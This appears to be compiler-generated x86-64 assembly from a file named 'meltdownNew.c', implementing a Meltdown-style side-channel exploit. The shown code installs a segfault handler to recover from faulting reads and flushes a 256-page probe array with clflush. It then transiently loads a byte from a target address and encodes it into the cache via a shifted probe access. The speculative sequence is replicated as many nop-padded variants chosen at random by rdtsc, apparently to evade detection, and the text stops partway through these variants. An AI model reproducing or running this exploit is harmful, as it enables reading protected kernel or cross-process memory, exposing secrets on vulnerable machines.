	.file	"meltdownNew.c"
	.text
	.type	sigaction_segv, @function
sigaction_segv:
.LFB9:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movq	-40(%rbp), %rax
	movq	%rax, -8(%rbp)
	leaq	__speculative_byte_load_exit(%rip), %rdx
	movq	-8(%rbp), %rax
	movq	%rdx, 168(%rax)
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE9:
	.size	sigaction_segv, .-sigaction_segv
	.globl	probe_one
	.type	probe_one, @function
probe_one:
.LFB12:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$2424, %rsp
	.cfi_offset 3, -24
	movq	%rdi, -2408(%rbp)
	movq	%rsi, -2416(%rbp)
	movl	%edx, -2420(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$5, -2376(%rbp)
	movl	$0, -2372(%rbp)
	movl	$0, -2384(%rbp)
	movl	$0, -2380(%rbp)
	movb	$0, -2393(%rbp)
	movq	$0, -2360(%rbp)
	leaq	-288(%rbp), %rax
	movl	$256, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2392(%rbp)
	jmp	.L3
.L13:
	leaq	-2336(%rbp), %rax
	movl	$2048, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2388(%rbp)
	jmp	.L4
.L5:
	movl	-2388(%rbp), %eax
	imull	-2420(%rbp), %eax
	movslq	%eax, %rdx
	movq	-2416(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -2352(%rbp)
	movq	-2352(%rbp), %rax
#APP
# 104 "meltdownNew.c" 1
	mfence
	clflush	0(%rax)
# 0 "" 2
#NO_APP
	nop
	addl	$1, -2388(%rbp)
.L4:
	cmpl	$255, -2388(%rbp)
	jle	.L5
	movl	$0, %edx
	movl	$0, %esi
	movl	$-1, %edi
	call	read@PLT
	movq	-2408(%rbp), %rdx
	movq	-2416(%rbp), %rcx
#APP
# 156 "meltdownNew.c" 1
	.global __speculative_byte_load_exit 
	92:                              
	xorq	%rax, %rax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$250, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lprobe_one_win0_var0
	cmpl	$1, %eax
	je	.Lprobe_one_win0_var1
	cmpl	$2, %eax
	je	.Lprobe_one_win0_var2
	cmpl	$3, %eax
	je	.Lprobe_one_win0_var3
	cmpl	$4, %eax
	je	.Lprobe_one_win0_var4
	cmpl	$5, %eax
	je	.Lprobe_one_win0_var5
	cmpl	$6, %eax
	je	.Lprobe_one_win0_var6
	cmpl	$7, %eax
	je	.Lprobe_one_win0_var7
	cmpl	$8, %eax
	je	.Lprobe_one_win0_var8
	cmpl	$9, %eax
	je	.Lprobe_one_win0_var9
	cmpl	$10, %eax
	je	.Lprobe_one_win0_var10
	cmpl	$11, %eax
	je	.Lprobe_one_win0_var11
	cmpl	$12, %eax
	je	.Lprobe_one_win0_var12
	cmpl	$13, %eax
	je	.Lprobe_one_win0_var13
	cmpl	$14, %eax
	je	.Lprobe_one_win0_var14
	cmpl	$15, %eax
	je	.Lprobe_one_win0_var15
	cmpl	$16, %eax
	je	.Lprobe_one_win0_var16
	cmpl	$17, %eax
	je	.Lprobe_one_win0_var17
	cmpl	$18, %eax
	je	.Lprobe_one_win0_var18
	cmpl	$19, %eax
	je	.Lprobe_one_win0_var19
	cmpl	$20, %eax
	je	.Lprobe_one_win0_var20
	cmpl	$21, %eax
	je	.Lprobe_one_win0_var21
	cmpl	$22, %eax
	je	.Lprobe_one_win0_var22
	cmpl	$23, %eax
	je	.Lprobe_one_win0_var23
	cmpl	$24, %eax
	je	.Lprobe_one_win0_var24
	cmpl	$25, %eax
	je	.Lprobe_one_win0_var25
	cmpl	$26, %eax
	je	.Lprobe_one_win0_var26
	cmpl	$27, %eax
	je	.Lprobe_one_win0_var27
	cmpl	$28, %eax
	je	.Lprobe_one_win0_var28
	cmpl	$29, %eax
	je	.Lprobe_one_win0_var29
	cmpl	$30, %eax
	je	.Lprobe_one_win0_var30
	cmpl	$31, %eax
	je	.Lprobe_one_win0_var31
	cmpl	$32, %eax
	je	.Lprobe_one_win0_var32
	cmpl	$33, %eax
	je	.Lprobe_one_win0_var33
	cmpl	$34, %eax
	je	.Lprobe_one_win0_var34
	cmpl	$35, %eax
	je	.Lprobe_one_win0_var35
	cmpl	$36, %eax
	je	.Lprobe_one_win0_var36
	cmpl	$37, %eax
	je	.Lprobe_one_win0_var37
	cmpl	$38, %eax
	je	.Lprobe_one_win0_var38
	cmpl	$39, %eax
	je	.Lprobe_one_win0_var39
	cmpl	$40, %eax
	je	.Lprobe_one_win0_var40
	cmpl	$41, %eax
	je	.Lprobe_one_win0_var41
	cmpl	$42, %eax
	je	.Lprobe_one_win0_var42
	cmpl	$43, %eax
	je	.Lprobe_one_win0_var43
	cmpl	$44, %eax
	je	.Lprobe_one_win0_var44
	cmpl	$45, %eax
	je	.Lprobe_one_win0_var45
	cmpl	$46, %eax
	je	.Lprobe_one_win0_var46
	cmpl	$47, %eax
	je	.Lprobe_one_win0_var47
	cmpl	$48, %eax
	je	.Lprobe_one_win0_var48
	cmpl	$49, %eax
	je	.Lprobe_one_win0_var49
	cmpl	$50, %eax
	je	.Lprobe_one_win0_var50
	cmpl	$51, %eax
	je	.Lprobe_one_win0_var51
	cmpl	$52, %eax
	je	.Lprobe_one_win0_var52
	cmpl	$53, %eax
	je	.Lprobe_one_win0_var53
	cmpl	$54, %eax
	je	.Lprobe_one_win0_var54
	cmpl	$55, %eax
	je	.Lprobe_one_win0_var55
	cmpl	$56, %eax
	je	.Lprobe_one_win0_var56
	cmpl	$57, %eax
	je	.Lprobe_one_win0_var57
	cmpl	$58, %eax
	je	.Lprobe_one_win0_var58
	cmpl	$59, %eax
	je	.Lprobe_one_win0_var59
	cmpl	$60, %eax
	je	.Lprobe_one_win0_var60
	cmpl	$61, %eax
	je	.Lprobe_one_win0_var61
	cmpl	$62, %eax
	je	.Lprobe_one_win0_var62
	cmpl	$63, %eax
	je	.Lprobe_one_win0_var63
	cmpl	$64, %eax
	je	.Lprobe_one_win0_var64
	cmpl	$65, %eax
	je	.Lprobe_one_win0_var65
	cmpl	$66, %eax
	je	.Lprobe_one_win0_var66
	cmpl	$67, %eax
	je	.Lprobe_one_win0_var67
	cmpl	$68, %eax
	je	.Lprobe_one_win0_var68
	cmpl	$69, %eax
	je	.Lprobe_one_win0_var69
	cmpl	$70, %eax
	je	.Lprobe_one_win0_var70
	cmpl	$71, %eax
	je	.Lprobe_one_win0_var71
	cmpl	$72, %eax
	je	.Lprobe_one_win0_var72
	cmpl	$73, %eax
	je	.Lprobe_one_win0_var73
	cmpl	$74, %eax
	je	.Lprobe_one_win0_var74
	cmpl	$75, %eax
	je	.Lprobe_one_win0_var75
	cmpl	$76, %eax
	je	.Lprobe_one_win0_var76
	cmpl	$77, %eax
	je	.Lprobe_one_win0_var77
	cmpl	$78, %eax
	je	.Lprobe_one_win0_var78
	cmpl	$79, %eax
	je	.Lprobe_one_win0_var79
	cmpl	$80, %eax
	je	.Lprobe_one_win0_var80
	cmpl	$81, %eax
	je	.Lprobe_one_win0_var81
	cmpl	$82, %eax
	je	.Lprobe_one_win0_var82
	cmpl	$83, %eax
	je	.Lprobe_one_win0_var83
	cmpl	$84, %eax
	je	.Lprobe_one_win0_var84
	cmpl	$85, %eax
	je	.Lprobe_one_win0_var85
	cmpl	$86, %eax
	je	.Lprobe_one_win0_var86
	cmpl	$87, %eax
	je	.Lprobe_one_win0_var87
	cmpl	$88, %eax
	je	.Lprobe_one_win0_var88
	cmpl	$89, %eax
	je	.Lprobe_one_win0_var89
	cmpl	$90, %eax
	je	.Lprobe_one_win0_var90
	cmpl	$91, %eax
	je	.Lprobe_one_win0_var91
	cmpl	$92, %eax
	je	.Lprobe_one_win0_var92
	cmpl	$93, %eax
	je	.Lprobe_one_win0_var93
	cmpl	$94, %eax
	je	.Lprobe_one_win0_var94
	cmpl	$95, %eax
	je	.Lprobe_one_win0_var95
	cmpl	$96, %eax
	je	.Lprobe_one_win0_var96
	cmpl	$97, %eax
	je	.Lprobe_one_win0_var97
	cmpl	$98, %eax
	je	.Lprobe_one_win0_var98
	cmpl	$99, %eax
	je	.Lprobe_one_win0_var99
	cmpl	$100, %eax
	je	.Lprobe_one_win0_var100
	cmpl	$101, %eax
	je	.Lprobe_one_win0_var101
	cmpl	$102, %eax
	je	.Lprobe_one_win0_var102
	cmpl	$103, %eax
	je	.Lprobe_one_win0_var103
	cmpl	$104, %eax
	je	.Lprobe_one_win0_var104
	cmpl	$105, %eax
	je	.Lprobe_one_win0_var105
	cmpl	$106, %eax
	je	.Lprobe_one_win0_var106
	cmpl	$107, %eax
	je	.Lprobe_one_win0_var107
	cmpl	$108, %eax
	je	.Lprobe_one_win0_var108
	cmpl	$109, %eax
	je	.Lprobe_one_win0_var109
	cmpl	$110, %eax
	je	.Lprobe_one_win0_var110
	cmpl	$111, %eax
	je	.Lprobe_one_win0_var111
	cmpl	$112, %eax
	je	.Lprobe_one_win0_var112
	cmpl	$113, %eax
	je	.Lprobe_one_win0_var113
	cmpl	$114, %eax
	je	.Lprobe_one_win0_var114
	cmpl	$115, %eax
	je	.Lprobe_one_win0_var115
	cmpl	$116, %eax
	je	.Lprobe_one_win0_var116
	cmpl	$117, %eax
	je	.Lprobe_one_win0_var117
	cmpl	$118, %eax
	je	.Lprobe_one_win0_var118
	cmpl	$119, %eax
	je	.Lprobe_one_win0_var119
	cmpl	$120, %eax
	je	.Lprobe_one_win0_var120
	cmpl	$121, %eax
	je	.Lprobe_one_win0_var121
	cmpl	$122, %eax
	je	.Lprobe_one_win0_var122
	cmpl	$123, %eax
	je	.Lprobe_one_win0_var123
	cmpl	$124, %eax
	je	.Lprobe_one_win0_var124
	cmpl	$125, %eax
	je	.Lprobe_one_win0_var125
	cmpl	$126, %eax
	je	.Lprobe_one_win0_var126
	cmpl	$127, %eax
	je	.Lprobe_one_win0_var127
	cmpl	$128, %eax
	je	.Lprobe_one_win0_var128
	cmpl	$129, %eax
	je	.Lprobe_one_win0_var129
	cmpl	$130, %eax
	je	.Lprobe_one_win0_var130
	cmpl	$131, %eax
	je	.Lprobe_one_win0_var131
	cmpl	$132, %eax
	je	.Lprobe_one_win0_var132
	cmpl	$133, %eax
	je	.Lprobe_one_win0_var133
	cmpl	$134, %eax
	je	.Lprobe_one_win0_var134
	cmpl	$135, %eax
	je	.Lprobe_one_win0_var135
	cmpl	$136, %eax
	je	.Lprobe_one_win0_var136
	cmpl	$137, %eax
	je	.Lprobe_one_win0_var137
	cmpl	$138, %eax
	je	.Lprobe_one_win0_var138
	cmpl	$139, %eax
	je	.Lprobe_one_win0_var139
	cmpl	$140, %eax
	je	.Lprobe_one_win0_var140
	cmpl	$141, %eax
	je	.Lprobe_one_win0_var141
	cmpl	$142, %eax
	je	.Lprobe_one_win0_var142
	cmpl	$143, %eax
	je	.Lprobe_one_win0_var143
	cmpl	$144, %eax
	je	.Lprobe_one_win0_var144
	cmpl	$145, %eax
	je	.Lprobe_one_win0_var145
	cmpl	$146, %eax
	je	.Lprobe_one_win0_var146
	cmpl	$147, %eax
	je	.Lprobe_one_win0_var147
	cmpl	$148, %eax
	je	.Lprobe_one_win0_var148
	cmpl	$149, %eax
	je	.Lprobe_one_win0_var149
	cmpl	$150, %eax
	je	.Lprobe_one_win0_var150
	cmpl	$151, %eax
	je	.Lprobe_one_win0_var151
	cmpl	$152, %eax
	je	.Lprobe_one_win0_var152
	cmpl	$153, %eax
	je	.Lprobe_one_win0_var153
	cmpl	$154, %eax
	je	.Lprobe_one_win0_var154
	cmpl	$155, %eax
	je	.Lprobe_one_win0_var155
	cmpl	$156, %eax
	je	.Lprobe_one_win0_var156
	cmpl	$157, %eax
	je	.Lprobe_one_win0_var157
	cmpl	$158, %eax
	je	.Lprobe_one_win0_var158
	cmpl	$159, %eax
	je	.Lprobe_one_win0_var159
	cmpl	$160, %eax
	je	.Lprobe_one_win0_var160
	cmpl	$161, %eax
	je	.Lprobe_one_win0_var161
	cmpl	$162, %eax
	je	.Lprobe_one_win0_var162
	cmpl	$163, %eax
	je	.Lprobe_one_win0_var163
	cmpl	$164, %eax
	je	.Lprobe_one_win0_var164
	cmpl	$165, %eax
	je	.Lprobe_one_win0_var165
	cmpl	$166, %eax
	je	.Lprobe_one_win0_var166
	cmpl	$167, %eax
	je	.Lprobe_one_win0_var167
	cmpl	$168, %eax
	je	.Lprobe_one_win0_var168
	cmpl	$169, %eax
	je	.Lprobe_one_win0_var169
	cmpl	$170, %eax
	je	.Lprobe_one_win0_var170
	cmpl	$171, %eax
	je	.Lprobe_one_win0_var171
	cmpl	$172, %eax
	je	.Lprobe_one_win0_var172
	cmpl	$173, %eax
	je	.Lprobe_one_win0_var173
	cmpl	$174, %eax
	je	.Lprobe_one_win0_var174
	cmpl	$175, %eax
	je	.Lprobe_one_win0_var175
	cmpl	$176, %eax
	je	.Lprobe_one_win0_var176
	cmpl	$177, %eax
	je	.Lprobe_one_win0_var177
	cmpl	$178, %eax
	je	.Lprobe_one_win0_var178
	cmpl	$179, %eax
	je	.Lprobe_one_win0_var179
	cmpl	$180, %eax
	je	.Lprobe_one_win0_var180
	cmpl	$181, %eax
	je	.Lprobe_one_win0_var181
	cmpl	$182, %eax
	je	.Lprobe_one_win0_var182
	cmpl	$183, %eax
	je	.Lprobe_one_win0_var183
	cmpl	$184, %eax
	je	.Lprobe_one_win0_var184
	cmpl	$185, %eax
	je	.Lprobe_one_win0_var185
	cmpl	$186, %eax
	je	.Lprobe_one_win0_var186
	cmpl	$187, %eax
	je	.Lprobe_one_win0_var187
	cmpl	$188, %eax
	je	.Lprobe_one_win0_var188
	cmpl	$189, %eax
	je	.Lprobe_one_win0_var189
	cmpl	$190, %eax
	je	.Lprobe_one_win0_var190
	cmpl	$191, %eax
	je	.Lprobe_one_win0_var191
	cmpl	$192, %eax
	je	.Lprobe_one_win0_var192
	cmpl	$193, %eax
	je	.Lprobe_one_win0_var193
	cmpl	$194, %eax
	je	.Lprobe_one_win0_var194
	cmpl	$195, %eax
	je	.Lprobe_one_win0_var195
	cmpl	$196, %eax
	je	.Lprobe_one_win0_var196
	cmpl	$197, %eax
	je	.Lprobe_one_win0_var197
	cmpl	$198, %eax
	je	.Lprobe_one_win0_var198
	cmpl	$199, %eax
	je	.Lprobe_one_win0_var199
	cmpl	$200, %eax
	je	.Lprobe_one_win0_var200
	cmpl	$201, %eax
	je	.Lprobe_one_win0_var201
	cmpl	$202, %eax
	je	.Lprobe_one_win0_var202
	cmpl	$203, %eax
	je	.Lprobe_one_win0_var203
	cmpl	$204, %eax
	je	.Lprobe_one_win0_var204
	cmpl	$205, %eax
	je	.Lprobe_one_win0_var205
	cmpl	$206, %eax
	je	.Lprobe_one_win0_var206
	cmpl	$207, %eax
	je	.Lprobe_one_win0_var207
	cmpl	$208, %eax
	je	.Lprobe_one_win0_var208
	cmpl	$209, %eax
	je	.Lprobe_one_win0_var209
	cmpl	$210, %eax
	je	.Lprobe_one_win0_var210
	cmpl	$211, %eax
	je	.Lprobe_one_win0_var211
	cmpl	$212, %eax
	je	.Lprobe_one_win0_var212
	cmpl	$213, %eax
	je	.Lprobe_one_win0_var213
	cmpl	$214, %eax
	je	.Lprobe_one_win0_var214
	cmpl	$215, %eax
	je	.Lprobe_one_win0_var215
	cmpl	$216, %eax
	je	.Lprobe_one_win0_var216
	cmpl	$217, %eax
	je	.Lprobe_one_win0_var217
	cmpl	$218, %eax
	je	.Lprobe_one_win0_var218
	cmpl	$219, %eax
	je	.Lprobe_one_win0_var219
	cmpl	$220, %eax
	je	.Lprobe_one_win0_var220
	cmpl	$221, %eax
	je	.Lprobe_one_win0_var221
	cmpl	$222, %eax
	je	.Lprobe_one_win0_var222
	cmpl	$223, %eax
	je	.Lprobe_one_win0_var223
	cmpl	$224, %eax
	je	.Lprobe_one_win0_var224
	cmpl	$225, %eax
	je	.Lprobe_one_win0_var225
	cmpl	$226, %eax
	je	.Lprobe_one_win0_var226
	cmpl	$227, %eax
	je	.Lprobe_one_win0_var227
	cmpl	$228, %eax
	je	.Lprobe_one_win0_var228
	cmpl	$229, %eax
	je	.Lprobe_one_win0_var229
	cmpl	$230, %eax
	je	.Lprobe_one_win0_var230
	cmpl	$231, %eax
	je	.Lprobe_one_win0_var231
	cmpl	$232, %eax
	je	.Lprobe_one_win0_var232
	cmpl	$233, %eax
	je	.Lprobe_one_win0_var233
	cmpl	$234, %eax
	je	.Lprobe_one_win0_var234
	cmpl	$235, %eax
	je	.Lprobe_one_win0_var235
	cmpl	$236, %eax
	je	.Lprobe_one_win0_var236
	cmpl	$237, %eax
	je	.Lprobe_one_win0_var237
	cmpl	$238, %eax
	je	.Lprobe_one_win0_var238
	cmpl	$239, %eax
	je	.Lprobe_one_win0_var239
	cmpl	$240, %eax
	je	.Lprobe_one_win0_var240
	cmpl	$241, %eax
	je	.Lprobe_one_win0_var241
	cmpl	$242, %eax
	je	.Lprobe_one_win0_var242
	cmpl	$243, %eax
	je	.Lprobe_one_win0_var243
	cmpl	$244, %eax
	je	.Lprobe_one_win0_var244
	cmpl	$245, %eax
	je	.Lprobe_one_win0_var245
	cmpl	$246, %eax
	je	.Lprobe_one_win0_var246
	cmpl	$247, %eax
	je	.Lprobe_one_win0_var247
	cmpl	$248, %eax
	je	.Lprobe_one_win0_var248
	cmpl	$249, %eax
	je	.Lprobe_one_win0_var249
	jmp	.Lprobe_one_win0_var0
## Variant 0
.Lprobe_one_win0_var0:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 1
.Lprobe_one_win0_var1:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 2
.Lprobe_one_win0_var2:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 3
.Lprobe_one_win0_var3:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 4
.Lprobe_one_win0_var4:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 5
.Lprobe_one_win0_var5:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 6
.Lprobe_one_win0_var6:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 7
.Lprobe_one_win0_var7:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 8
.Lprobe_one_win0_var8:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 9
.Lprobe_one_win0_var9:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 10
.Lprobe_one_win0_var10:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 11
.Lprobe_one_win0_var11:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 12
.Lprobe_one_win0_var12:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 13
.Lprobe_one_win0_var13:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 14
.Lprobe_one_win0_var14:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 15
.Lprobe_one_win0_var15:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 16
.Lprobe_one_win0_var16:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 17
.Lprobe_one_win0_var17:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 18
.Lprobe_one_win0_var18:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 19
.Lprobe_one_win0_var19:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 20
.Lprobe_one_win0_var20:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 21
.Lprobe_one_win0_var21:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 22
.Lprobe_one_win0_var22:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 23
.Lprobe_one_win0_var23:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 24
.Lprobe_one_win0_var24:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 25
.Lprobe_one_win0_var25:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 26
.Lprobe_one_win0_var26:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 27
.Lprobe_one_win0_var27:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 28
.Lprobe_one_win0_var28:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 29
.Lprobe_one_win0_var29:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 30
.Lprobe_one_win0_var30:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 31
.Lprobe_one_win0_var31:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 32
.Lprobe_one_win0_var32:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 33
.Lprobe_one_win0_var33:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 34
.Lprobe_one_win0_var34:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 35
.Lprobe_one_win0_var35:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 36
.Lprobe_one_win0_var36:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 37
.Lprobe_one_win0_var37:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 38
.Lprobe_one_win0_var38:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 39
.Lprobe_one_win0_var39:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 40
.Lprobe_one_win0_var40:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
